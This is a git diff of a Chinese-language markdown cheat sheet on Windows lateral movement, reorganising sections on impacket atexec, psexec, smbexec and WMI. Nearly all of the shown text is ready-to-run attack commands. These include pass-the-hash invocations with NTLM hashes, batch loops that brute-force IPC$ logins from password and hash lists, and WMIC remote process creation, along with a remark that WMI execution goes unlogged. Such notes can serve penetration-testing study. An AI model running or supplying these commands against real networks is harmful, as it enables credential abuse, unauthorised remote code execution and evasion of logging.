@@ -518,13 +518,15 @@ sc \\192.168.210.107 start hacker      #启动hacker服务
 ```
 
 ## impacket命令
+Atexec
 ```
 需要135端口开启
 Atexec.exe hacker/administrator:abc123@192.168.202.148 "whoami"
 
 Atexec.exe -hashes :fac5d668099409cb6fa223a32ea493b6 hacker/administrator@192.168.202.148 "whoami"
-
-
+```
+批量
+```
 已知密码和用户批量连接ip:
 FOR /F %%i in (ips.txt) do net use \%%i\ipc$ “password” /user:hacker\administrator
 
@@ -533,8 +535,10 @@ FOR /F %%i in (pass.txt) do net use \192.168.202.148\ipc$ "%%i" /user:test\admin
 
 已知用户和ip批量连接hash：
 FOR /F %%i in (hash.txt) do atexec.exe -hashes :"%%i" test/administrator@192.168.202.148 "whoami"
+```
 
-
+psexec
+```
 官方Psexec第一种利用方法：可以先有ipc链接，再用psexec运行相应的程序：
 Net use \192.168.202.148\ipc$ zxcvbnm123 /user:test\Administrator
 Psexec \192.168.202.148 -accepteula -s cmd
@@ -543,11 +547,17 @@ Psexec \192.168.202.148 -accepteula -s cmd
 Psexec \192.168.202.148 -u Administrator -p zxcvbnm123 -s cmd
 
 PsExec -hashes :fac5d668099409cb6fa223a32ea493b6 test.com/Administrator@192.168.202.148 "whoami" (官方执行不了)
+```
 
+smbexec
+```
 需要445端口开启
 Smbexec test/Administrator:zxcvbnm123@192.168.202.148
 Smbexec -hashes :fac5d668099409cb6fa223a32ea493b6 test/Administrator@192.168.202.148
+```
 
+wmi
+```
 WMI利用135端口，支持明文和hash两种方式进行身份验证，且系统日志不记录。
 第一种：使用系统自带的WMIC明文传递执行相应命令，但执行的结果不回显（先管理员账户登录）
 Wmic /node:192.168.202.148 /user:Administrator /password:zxcvbnm123 process call create "cmd.exe /c ipconfig >C:/1.txt"
